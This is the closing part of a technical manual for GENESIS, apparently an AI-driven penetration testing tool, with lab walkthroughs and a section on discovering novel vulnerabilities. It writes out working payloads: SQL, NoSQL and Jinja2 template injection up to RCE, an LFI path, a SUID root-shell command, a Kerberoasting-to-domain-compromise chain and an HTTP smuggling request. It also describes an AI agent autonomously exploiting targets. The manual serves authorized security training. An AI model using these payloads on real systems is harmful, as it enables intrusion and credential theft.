| **MCP** | Model Context Protocol — standard for AI tool/resource integration |
| **MITRE** | US non-profit that maintains the ATT&CK framework and CVE database |
| **MongoDB** | Document-oriented NoSQL database |
| **nmap** | Network Mapper — the standard port scanner |
| **OOB** | Out-of-Band — communication channel separate from the primary application |
| **OSINT** | Open Source Intelligence — information gathered from public sources |
| **Port** | Numbered network endpoint (0-65535) associated with a service |
| **PostgreSQL** | Open-source relational database |
| **Prompt caching** | Anthropic feature caching static prompt portions at reduced token cost |
| **RCE** | Remote Code Execution — ability to run arbitrary code on the target server |
| **Redis** | In-memory key-value store — used for caching, queuing, pub/sub |
| **SMB** | Server Message Block — Windows file/printer sharing protocol |
| **SSRF** | Server-Side Request Forgery — server fetches attacker-controlled URL |
| **SSTI** | Server-Side Template Injection — attacker injects code into template engine |
| **SSL/TLS** | Cryptographic protocols securing HTTPS connections |
| **SPN** | Service Principal Name — identifier for a Kerberos service instance |
| **SQL** | Structured Query Language — used to query relational databases |
| **SQLi** | SQL Injection — injecting SQL code into database queries |
| **Token (LLM)** | Unit of text for LLMs (roughly 4 characters or 0.75 words) |
| **Token (auth)** | Opaque string used for authentication (e.g. session cookie, API key, JWT) |
| **TOCTOU** | Time-Of-Check/Time-Of-Use — race condition between check and action |
| **WAF** | Web Application Firewall — filters malicious HTTP requests |
| **WebSocket** | Protocol for bi-directional real-time browser-server communication |
| **XXE** | XML External Entity — injecting external XML entities to read files or make requests |
| **XSS** | Cross-Site Scripting — injecting JavaScript into web pages viewed by other users |
| **Zero-day** | Vulnerability not publicly known and with no available patch |
| **BOLA** | Broken Object Level Authorization — API-specific term for IDOR (see IDOR) |
| **CORS** | Cross-Origin Resource Sharing — browser mechanism controlling cross-origin HTTP requests |
| **PKCE** | Proof Key for Code Exchange — OAuth extension preventing authorization code interception |
| **NoSQL injection** | Injecting database operators ($ne, $gt) into NoSQL queries to manipulate results |
| **Cache deception** | Tricking a cache into storing a sensitive authenticated page as a public resource |
| **Cache poisoning** | Causing a cache to store and serve a malicious response to all users |
| **Prototype pollution** | Injecting properties into JavaScript's Object.prototype, affecting all objects in a process |
| **GraphQL** | API query language with a single endpoint and schema-driven type system |
| **OAuth 2.0** | Authorization framework allowing delegated access without sharing passwords |
| **OIDC** | OpenID Connect — identity layer on top of OAuth 2.0 providing user authentication |
| **HTTP smuggling** | Exploiting front-end/back-end disagreement on HTTP/1.1 request boundary parsing |
| **alg:none** | JWT attack where the algorithm is set to "none" to bypass signature validation |
| **alg confusion** | JWT attack using RS256 public key as HS256 HMAC secret to forge tokens |
| **Canary detection** | Sending a clean follow-up request after a pollution attempt to detect server-side state change |
| **Desync** | Front-end and back-end servers process different bytes as part of the same HTTP request |
| **Falsification criteria** | Pre-defined conditions that would definitively rule out a hypothesis — required in GENESIS hypotheses |
| **attack_chain_id** | Identifier linking related hypotheses and vulnerabilities into a multi-step attack path |

---

## 22. Testing a Lab Target — Practical Walkthrough

This section provides step-by-step guidance for running GENESIS against each of the five vulnerable machines in the GENESIS lab environment. All targets are isolated on the `10.10.0.0/24` network and are intentionally vulnerable — designed for security training.

### 22.1 Lab Environment Overview

| Target | IP | Application | Difficulty | Best Profile |
|---|---|---|---|---|
| Metasploitable 2 | 10.10.0.10 | Linux + multi-service | Medium | Full Assessment |
| DVWA | 10.10.0.11 | PHP web app | Low | Quick Scan |
| Juice Shop | 10.10.0.12 | Node.js web app | Medium–High | Full Assessment |
| WebGoat | 10.10.0.13 | Java web app | Medium | Stealth |
| vAPI | 10.10.0.14 | REST API | High | Full Assessment |

**Starting the lab:**
```bash
cd /opt/genesis-lab
docker compose up -d
# Wait ~60 seconds for all containers to initialize
docker compose ps  # all should show "healthy"
```

**Starting GENESIS:**
```bash
cd /opt/genesis
docker compose up -d
# Navigate to http://localhost:3000
```

---

### 22.2 Target 1: Metasploitable 2 — `10.10.0.10`

**What it is:** A deliberately vulnerable Linux VM with dozens of intentionally misconfigured services. The most vulnerable machine in the lab — almost everything is exploitable.

**Session setup:**
1. Click **New Session** in GENESIS
2. Target: `10.10.0.10`
3. Profile: **Full Assessment**
4. Agent mode: **Multi-Agent** (runs all four sub-agents in parallel)
5. Click **Start**

**What to expect from GENESIS:**

*Phase 1 — Recon (0–5 minutes):*
- nmap discovers 20+ open ports: 21 (FTP), 22 (SSH), 23 (Telnet), 25 (SMTP), 80 (HTTP), 139/445 (SMB), 3306 (MySQL), 5432 (PostgreSQL), 6000 (X11), 6667 (IRC), 8009 (Tomcat AJP), 8180 (Tomcat HTTP)
- GENESIS emits a TOPOLOGY_UPDATE for each discovered host/service
- The Topology panel updates in real-time as ports are found

*Phase 2 — Analysis (5–10 minutes):*
- whatweb identifies the web application type on port 80 and 8180
- wafw00f confirms no WAF present
- sslscan checks port 443 (if present)
- enum4linux attempts null session against SMB → likely succeeds → user list extracted

*Phase 3 — Exploitation (10–25 minutes):*
- nuclei scans for CVEs against the service versions
- nikto scans port 80 and 8180 (Tomcat)
- GENESIS will likely discover: FTP anonymous login (CVE-2010-1938), vsftpd backdoor (CVE-2011-2523), Samba username map script (CVE-2007-2447), UnrealIRCd backdoor (CVE-2010-2075), Tomcat manager exposed with default credentials, MySQL with root and no password, PostgreSQL with postgres/postgres, rexec/rsh trust relationship

*Expected findings:*
- 10–20 Critical/High vulnerabilities
- Attack chain: Anonymous FTP → file upload → vsftpd backdoor RCE → root shell
- Second chain: SMB username map script → direct root shell

**Tips for Metasploitable:**
- Watch the Deep Thought panel — Claude's reasoning about which port to attack first reveals its prioritization logic
- The Topology panel will fill quickly with services — this is the best target for seeing the topology visualization in action
- Session will likely exceed 20 iterations — this is expected for a target this rich in vulnerabilities

---

### 22.3 Target 2: DVWA — `10.10.0.11`

**What it is:** Damn Vulnerable Web Application — a PHP/MySQL web app with intentional vulnerabilities at three difficulty levels (Low, Medium, High).

**Session setup:**
1. Target: `10.10.0.11`
2. Profile: **Quick Scan** (covers the main web app efficiently)
3. Agent mode: **Single Agent**
4. Click **Start**

**What to expect:**

*Iteration 1–3:* nmap finds ports 80 (Apache) and 3306 (MySQL). httpx confirms the DVWA login page at `http://10.10.0.11/dvwa/login.php`.

*Iteration 4–5:* whatweb identifies PHP/Apache. GENESIS checks for default credentials: `admin/password` → login succeeds. Claude stores the session cookie in session_memory under `credentials`.

*Iteration 6–10:* With an authenticated session, GENESIS systematically tests DVWA's modules:
- SQL injection: `?id=1' OR 1=1--` → sqlmap confirms UNION-based injection → extracts users table
- XSS: xsstrike finds reflected XSS in the name field
- Command injection: commix tests the ping utility → OS command execution confirmed
- File inclusion: `?page=../../../../etc/passwd` → LFI confirmed → `/etc/passwd` read
- CSRF: GENESIS generates a proof-of-concept HTML page demonstrating the CSRF

*Expected findings:* 8–12 High/Critical vulnerabilities covering all OWASP Top 10 categories.

**Tips for DVWA:**
- DVWA's difficulty is configured in-app (Security → Low/Medium/High). Start on Low — GENESIS will exhaust vulnerabilities faster and demonstrate chains. Switch to Medium to see how GENESIS adapts when simple payloads are filtered.
- The Patch Code tab for each finding shows the exact PHP fix — useful for understanding the remediation

---

### 22.4 Target 3: Juice Shop — `10.10.0.12`

**What it is:** OWASP Juice Shop — a modern Node.js/Angular web application with 100+ intentional vulnerabilities covering all OWASP categories. This is the richest target for demonstrating GENESIS's advanced capabilities.

**Session setup:**
1. Target: `http://10.10.0.12:3000`
2. Profile: **Full Assessment**
3. Agent mode: **Multi-Agent**
4. Click **Start**

**What to expect — advanced tool activations:**

*JWT attacks:* Juice Shop uses JWTs for authentication. GENESIS will:
1. Register a test account at `/api/Users` 
2. Capture the JWT in the login response
3. Run `jwt_probe` on the JWT with `target_url=http://10.10.0.12:3000/api/Users/1`
4. Discover that Juice Shop's original versions used weak JWT secrets (`jwt_probe` brute-forces it)
5. Forge an admin token → access `/administration` panel

*GraphQL probing:* Juice Shop has a `/graphql` endpoint.
1. `graphql_probe` tests introspection → enabled
2. Schema reveals mutations including `addChallengeSolvedNotification`
3. Field suggestions leak internal type names not documented in the UI

*CORS testing:* `cors_probe` on the `/api` endpoints reveals whether reflected ACAO is present.

*IDOR:* Juice Shop's `/api/Baskets/1` exposes order data.
1. GENESIS registers two accounts, stores both JWTs in session_memory
2. `idor_probe` cross-validates basket IDs → confirms IDOR if auth check is missing

*Expected findings:* 15–30 findings across all severity levels. Juice Shop has challenges ranging from trivial (score board) to expert (cryptographic vulnerabilities, OAuth bypass).

**Tips for Juice Shop:**
- The session takes 30–60 minutes for a full assessment — Juice Shop is the most complex target
- Watch for GENESIS creating attack chains: XSS → cookie theft → account takeover → admin panel access is a common chain here
- The Score Board (`/#/score-board`) in Juice Shop shows which challenges have been solved — you can cross-reference GENESIS's findings against the official challenge list

---

### 22.5 Target 4: WebGoat — `10.10.0.13`

**What it is:** OWASP WebGoat — a Java/Spring web application designed as an interactive security training platform. Unlike Juice Shop, WebGoat has explicit lesson pages that explain each vulnerability.

**Session setup:**
1. Target: `http://10.10.0.13:8080/WebGoat`
2. Profile: **Stealth** (WebGoat logs extensively — stealth mode reduces noise)
3. Agent mode: **Single Agent**
4. Click **Start**

**What to expect:**

*Initial discovery:* nmap finds port 8080 (Tomcat). httpx identifies WebGoat's login page. GENESIS registers an account (`guest/guest` often works, or Claude tries common defaults).

*Java-specific analysis:* whatweb identifies the Java/Spring stack. Claude's strategy shifts to:
- SSTI testing with Java expression language probes: `${7*7}`, `#{7*7}`, `*{7*7}`
- XXE testing (Java XML parsers are notoriously vulnerable)
- Deserialization attack surface identification
- SpEL injection in Spring Expression Language contexts

*`ssti_detect` on WebGoat:* WebGoat has an SSTI lesson. GENESIS will:
1. Find the template injection parameter
2. Send `${7*7}` → response contains "49" → SSTI confirmed
3. Probe `${T(java.lang.Runtime)}` → error message confirms Java Runtime accessible → RCE pathway documented

*Expected findings:* 8–15 findings. WebGoat's vulnerabilities tend to be demonstration-quality (easy to find, well-categorized). Notable: XXE, path traversal, JWT vulnerabilities, SQL injection, broken access control.

**Tips for WebGoat:**
- WebGoat's URL structure (`/WebGoat/start.mvc#lesson/...`) means GENESIS must be given the base URL, not individual lesson URLs
- Deep Thought panel shows Claude reasoning about Java-specific attack vectors — valuable for learning Java security patterns

---

### 22.6 Target 5: vAPI — `10.10.0.14`

**What it is:** vAPI (Vulnerable Adversarial Penetration Interface) — a purpose-built vulnerable REST API specifically designed to demonstrate the OWASP API Security Top 10. The richest target for GENESIS's new HTTP vulnerability analysis tools.

**Session setup:**
1. Target: `http://10.10.0.14:5000`
2. Profile: **Full Assessment**
3. Agent mode: **Multi-Agent**
4. Click **Start**

**What to expect — the API security showcase:**

*Endpoint discovery:* gobuster/feroxbuster discover the vAPI route structure: `/vapi/api1/`, `/vapi/api2/`, etc. — each route tests a different OWASP API Top 10 category.

*IDOR on API1 (`/vapi/api1/user/{id}`):*
1. Claude registers two users, stores both JWTs in session_memory under `credentials`
2. `idor_probe` sweeps IDs 1–20 with user_1_token
3. Phase 2 cross-validates with user_2_token → user 1's token can access user 2's data
4. IDOR confirmed — BOLA (Broken Object Level Authorization)

*Mass assignment on API3 (`/vapi/api3/user/`):*
1. arjun discovers hidden fields in the user registration endpoint
2. `prototype_pollution_probe` tests if extra JSON keys are accepted
3. Claude manually tests `{"username":"x","password":"x","admin":true}` → account created with admin flag

*NoSQL injection on API8 (`/vapi/api8/user/login`):*
1. Stack detection: vAPI's API8 uses MongoDB
2. `nosql_probe` tests `{"username":{"$ne":null},"password":{"$ne":null}}`
3. Response returns first user in database → authentication bypassed with no credentials
4. Boolean blind confirms: true condition returns 200+data, false condition returns 404

*JWT attacks on API2 (`/vapi/api2/user/me`):*
1. Login to API2, capture JWT
2. `jwt_probe` — brute-forces the HMAC secret (`"secret123"` or similar weak key found)
3. Forged admin token accepted → access to all users' data

*Expected findings:* 10 High/Critical vulnerabilities — one per API Top 10 category.

**Tips for vAPI:**
- vAPI is the best target for demonstrating the 10 new HTTP analysis tools — designed specifically to be vulnerable to these attack classes
- Start with Multi-Agent mode — the Recon + Analyst phase maps the API endpoints quickly, then Exploit phase runs all 10 new tools systematically
- Each API endpoint (`api1`, `api2`, ...) maps to one OWASP API Top 10 category — GENESIS's findings will align with these categories in the vulnerability report

---

### 22.7 Reading the Results

After any session completes, the Session Viewer shows five tabs:

**Vulnerabilities tab:**
- Each card shows: severity badge (Critical/High/Medium/Low/Info), title, CVSS score, MITRE technique, verification status (confirmed/disputed/unverified)
- Click any card to expand: full description, evidence, exploit code (PoC), patch code, attack chain position
- Filter by severity, status, or attack chain ID
- Export button generates: PDF report, JSON export, or executive summary

**Topology tab:**
- Hosts discovered during recon as nodes
- Services as child nodes with port numbers
- Vulnerabilities linked to their service node
- Click any node for full detail panel

**Thoughts tab:**
- Ordered log of every text output Claude produced during the session
- Labeled by agent type (recon / analyst / exploit / code) in multi-agent mode
- Use this to understand WHY Claude made each decision

**Deep Thought tab:**
- Claude's private extended thinking content (token budget: 5000)
- Shows reasoning before each tool call
- Critical for understanding novel vulnerability chains — this is where you see the "aha moment"

**Hypotheses tab:**
- All hypotheses Claude formed during the session
- Color-coded: active (orange), confirmed (green), ruled_out (red)
- Each shows confidence, evidence for/against, falsification criteria, and next test

---

## 23. How GENESIS Finds Novel Vulnerabilities — Web Apps and Operating Systems

This section explains what "novel" means in the context of GENESIS and how the MYTHOS engine discovers vulnerabilities that automated scanners and signature databases miss.

### 23.1 What Makes a Vulnerability "Novel"?

A vulnerability is novel when it meets any of these criteria:

1. **No CVE exists** — the vulnerability has not been publicly reported and catalogued
2. **Logic-specific** — the vulnerability is in how this application implements its business rules, not in a third-party library
3. **Chain-dependent** — the vulnerability is only critical because of two other findings; individually each step is Low severity
4. **Behavioral** — the vulnerability requires comparing responses across many requests to be visible; no single request reveals it

Traditional scanners work by matching patterns: "does this response look like CVE-2021-44228?" If the signature doesn't match, the scanner reports nothing. GENESIS uses reasoning instead of matching — it asks "what should this endpoint do, and what happens when I probe the boundaries?"

---

### 23.2 Novel Web Application Vulnerability Discovery

#### Discovery Method 1: IDOR via Enumeration + Cross-Token Validation

Most scanners test IDOR by sending an unauthenticated request and checking for 401. This misses the vast majority of IDOR vulnerabilities, which return 200 with empty data rather than an access error.

**GENESIS approach:**
1. session_memory stores all discovered object IDs and auth tokens during the assessment
2. After accumulating 2+ auth tokens (from registration or credential spray), idor_probe cross-validates
3. The novel detection: comparing response bodies between token A and token B reveals that the same ID returns different data — proving the object exists but also proving that both tokens can read it

**Novel chain example — IDOR + CORS:**
```
Finding 1 (Medium): CORS misconfiguration — ACAO reflects attacker.com, ACAC: true
Finding 2 (Medium): IDOR on /api/users/{id} — authenticated user can read any profile

Chain logic: IDOR requires an auth token. An attacker at evil.com normally can't make
credentialed API requests to the victim's app. But with CORS misconfiguration, evil.com
CAN make credentialed requests — and can use the victim's browser as a proxy to enumerate
all user IDs and extract all profile data.

Combined severity: Critical (CORS bypass enables credential-carrying IDOR enumeration)
Neither finding is Critical alone.
```

#### Discovery Method 2: SSTI in Unexpected Surfaces

Template engines appear in unexpected places beyond the obvious "user name in greeting":
- PDF generators (invoice templates, report generators)
- Email templates (password reset, notifications)
- Error pages (stack traces that render template syntax)
- Admin panels (report builder, mail composer)

**GENESIS approach:**
Claude does not just test `?name=` fields. It reads the page structure, identifies any field where the value appears in the response, and applies ssti_detect probes. If an error page reflects the request URL, GENESIS tests `{{7*7}}` in the URL path. If a report builder has a template field, GENESIS tests it even though it appears to be "formatting only."

**Novel chain example — SSTI → RCE → credential dump:**
```
Finding: SSTI in report builder's "Title" field (Jinja2 confirmed via 49 response)
Escalation 1: {{''.__class__.__mro__[1].__subclasses__()}} — confirms Python class access
Escalation 2: {{''.__class__.__mro__[1].__subclasses__()[401]('/etc/passwd').read()}} — file read
Escalation 3: {{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['os'].popen('id').read()}} — RCE

This is discovered because GENESIS tested a "title" field in what appeared to be a formatting
widget — a field a traditional scanner would never prioritize.
```

#### Discovery Method 3: JWT alg:none as Assessment Entry Point

Many assessments begin with a black-box web application and a user registration endpoint. GENESIS uses JWT attacks to escalate from a low-privilege authenticated user to an admin within the first few iterations.

**GENESIS approach:**
1. Register an account → capture JWT from response
2. Run jwt_probe → test alg:none, blank secret, common secrets
3. If any succeed → forge admin token → test access to admin endpoints
4. Admin access unlocks source code exposure (backup routes), user data export, configuration endpoints

This chain happens before any vulnerability scanner would have finished its initial port scan.

#### Discovery Method 4: Race + IDOR Chain

Race conditions and IDOR combine into a unique attack vector:

```
Step 1: IDOR discovered on /api/orders/{id} — any authenticated user can view any order
Step 2: race_probe on /api/orders/checkout — sends 15 simultaneous checkout requests
Step 3: 3 succeed with 200 → race condition confirmed on checkout (deduplication failure)

Combined attack: Race condition creates duplicate orders. IDOR allows reading any order.
The attacker can trigger a race to create a fraudulent order and then read victim order data.
```

#### Discovery Method 5: GraphQL Introspection → Mutation Exploitation

```
Step 1: graphql_probe detects introspection enabled
Step 2: Schema shows mutation "updateUserRole(userId: ID!, role: String!)"
Step 3: Mutation is not linked in any UI element — invisible to manual testing
Step 4: GENESIS calls the mutation with own userId + role: "admin"
Step 5: Success → privilege escalation to admin without any auth bypass

This is only discoverable because introspection revealed the mutation existed.
No scanner would find this — it requires understanding the schema and inferring that
an undocumented mutation with "role" in its name is worth testing.
```

#### Discovery Method 6: Three-Low-Into-One-Critical Chain

The hypothesis journal enables GENESIS to link findings that individually appear Low severity:

```
Finding 1 (Low): X-Forwarded-Host header reflected in HTML meta tag
Finding 2 (Low): Cache-Control: public on authenticated user dashboard
Finding 3 (Low): X-Cache: HIT observed after second request

Alone: each is informational or low severity.
Combined: X-Forwarded-Host reflection → body contains malicious script src
         Cache-Control: public → CDN caches the response
         Second request confirms caching active

Chain: One attacker request poisons the CDN cache with a malicious script URL.
       Every user who visits the dashboard gets the malicious script.
       This is stored XSS via cache poisoning — Critical severity.
```

---

### 23.3 Novel Operating System Vulnerability Discovery

GENESIS's OS-level discovery combines network service fingerprinting, static analysis, and Active Directory knowledge.

#### OS Discovery Method 1: Binary Analysis for Hardcoded Credentials

When services expose files or when gobuster finds accessible archives:

```
Scenario: feroxbuster finds /backup/app.tar.gz accessible
Step 1: curl_probe downloads the archive
Step 2: binary_analyzer extracts strings from compiled binaries within the archive
Step 3: Finds: "jdbc:mysql://10.10.1.5:3306/proddb" + "password123"
Step 4: netexec tests the credential against MySQL on 10.10.1.5 → success

Novel element: The credential was in a production binary, not a config file.
No secrets scanner would find it without static analysis of the binary.
```

#### OS Discovery Method 2: Service Version → Unpatched CVE Chain

```
Step 1: nmap finds: "vsftpd 2.3.4" on port 21
Step 2: nuclei template for CVE-2011-2523 fires
Step 3: vsftpd 2.3.4 has a backdoor — sending ":)" in the username triggers a shell on port 6200
Step 4: oob_check confirms the backdoor by injecting a callback URL as the username
Step 5: Port 6200 opens → shell confirmed

This is a known CVE, but GENESIS's novelty is the OOB confirmation — 
it detects the vulnerability without directly exploiting it, preserving the system's state.
```

#### OS Discovery Method 3: SUID/SGID Binary Exploitation Path

When command injection or shell access is established, GENESIS uses code_pattern_search and binary_analyzer to identify privilege escalation paths:

```
Step 1: commix establishes command injection via POST /ping → shell execution
Step 2: code_pattern_search finds all SUID binaries: find / -perm -4000
Step 3: Identifies: /usr/bin/find has SUID bit (runs as root)
Step 4: GTFOBins lookup: "find . -exec /bin/sh -p \;" → root shell

This privilege escalation chain requires correlating:
1. An injection vulnerability (found by commix)
2. A SUID binary (found by code_pattern_search)
3. GTFOBins knowledge (Claude's training data)
No single tool provides this — it requires the cross-tool correlation GENESIS performs.
```

#### OS Discovery Method 4: Active Directory Attack Chain

For Windows networks with AD:

```
Phase 1 (enum4linux): Null session succeeds → user list: [alice, bob, svc_backup, admin]
Phase 2 (kerbrute): User enumeration via Kerberos → confirms svc_backup is kerberoastable
Phase 3 (impacket GetUserSPNs): Extracts Kerberos ticket for svc_backup
Phase 4 (john): Cracks ticket offline in 90 seconds → password: "Backup2021!"
Phase 5 (netexec): Tests "svc_backup"/"Backup2021!" against SMB on all domain hosts
  → Valid on DC01, FS01, BACKUP01
Phase 6 (impacket secretsdump): With svc_backup on DC01 → dumps all NTLM hashes
Phase 7 (john): Cracks domain admin hash → full domain compromise

Novel element: svc_backup was not visible in any web interface or obvious enumeration.
It was discovered because kerbrute detected it as a Kerberos principal, and GENESIS
recognized it as a service account (svc_ prefix) likely to have a crackable password.
```

#### OS Discovery Method 5: HTTP Smuggling → Internal Service Access

HTTP request smuggling against a front-end proxy can expose internal-only services:

```
Step 1: http_smuggling_probe detects CL.TE desync on the public load balancer
Step 2: GENESIS crafts a smuggled request targeting the internal admin endpoint:

Attacker sends (via CL.TE desync):
  POST / HTTP/1.1              ← front-end sees this
  Content-Length: 4
  Transfer-Encoding: chunked
  
  [chunk: "GET /internal-admin HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n"]
  
  ← back-end processes the chunk as a new request to /internal-admin

Step 3: Back-end routes to internal admin endpoint not exposed externally
Step 4: Response contains admin panel HTML → internal endpoint accessible via smuggling

Novel element: /internal-admin returns 404 on direct access.
Only via request smuggling can it be reached — no scanner would discover this
without the raw TCP desync capability.
```

---

### 23.4 Why GENESIS Finds What Scanners Miss

| Detection Type | How Traditional Scanners Work | How GENESIS Works |
|---|---|---|
| IDOR | Send unauthenticated request; check for 403 | Register two accounts; cross-validate with both tokens |
| SSTI in unexpected fields | Test `?name=` parameters for template syntax | Analyze all reflected fields in all pages; test all of them |
| JWT alg:none | Not tested (signature format inspection) | Actively forges and sends modified tokens |
| GraphQL mutations | No schema awareness; fires static payloads | Reads full schema via introspection; tests enumerated mutations |
| Race conditions | Not tested (requires concurrent requests) | race_probe sends N parallel requests simultaneously |
| Chained findings | Each finding scored independently | Hypothesis journal links findings; computes chain severity |
| Cache poisoning | Not tested (complex multi-request sequence) | cache_probe tests 6 unkeyed header vectors with cache verification |
| Prototype pollution | Not tested | prototype_pollution_probe + canary cross-request detection |
| Blind SSRF | Requires external callback server | oob_check provides built-in callback + Redis registration |
| HTTP smuggling | Uses HTTP clients (headers normalized) | Raw TCP sockets via node:net preserve header ambiguity |

The fundamental difference: **scanners match patterns; GENESIS reasons about behavior**. A scanner checks "does this response contain a known error string?" GENESIS asks "what should this endpoint do, what happens when I change the auth token, and does the application's behavior match what correct authorization enforcement would look like?"

---

*GENESIS Technical Reference — v2.0*  
*This document describes GENESIS as of the MYTHOS engine v2.0 release.*  
*For authorized security assessment use only.*
